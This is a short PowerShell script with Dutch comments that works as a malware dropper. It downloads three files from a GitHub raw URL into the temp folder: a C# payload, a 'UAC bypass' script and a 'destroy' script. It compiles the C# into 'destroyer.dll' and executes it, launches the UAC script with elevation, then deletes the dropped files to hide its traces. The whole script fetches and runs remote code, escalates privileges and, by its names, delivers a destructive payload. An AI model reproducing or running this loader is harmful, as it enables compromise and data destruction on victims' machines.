$temp = $env:TEMP
$web = New-Object Net.WebClient

# Download bestanden
$files = @(
    "https://raw.githubusercontent.com/archvault-cmd/files/refs/heads/main/payload.cs"
    "https://raw.githubusercontent.com/archvault-cmd/files/refs/heads/main/uac.ps1"
    "https://raw.githubusercontent.com/archvault-cmd/files/refs/heads/main/destroy.ps1"
)

foreach($url in $files){
    $name = [System.IO.Path]::GetFileName($url)
    $web.DownloadFile($url, "$temp\$name")
}

# Compileer C#
$cs = Get-Content "$temp\payload.cs" -Raw
Add-Type -TypeDefinition $cs -Language CSharp -ReferencedAssemblies "System.Windows.Forms","System.Drawing" -OutputAssembly "$temp\destroyer.dll"

# Run C#
$asm = [System.Reflection.Assembly]::LoadFrom("$temp\destroyer.dll")
$asm.GetType("Destroyer.Program").GetMethod("Main").Invoke($null, @())

# UAC Bypass
Start-Process powershell -ArgumentList "-File `"$temp\uac.ps1`"" -Verb RunAs

Start-Sleep -Seconds 60
Remove-Item "$temp\payload.cs","$temp\uac.ps1","$temp\destroy.ps1","$temp\destroyer.dll" -Force -ErrorAction SilentlyContinue
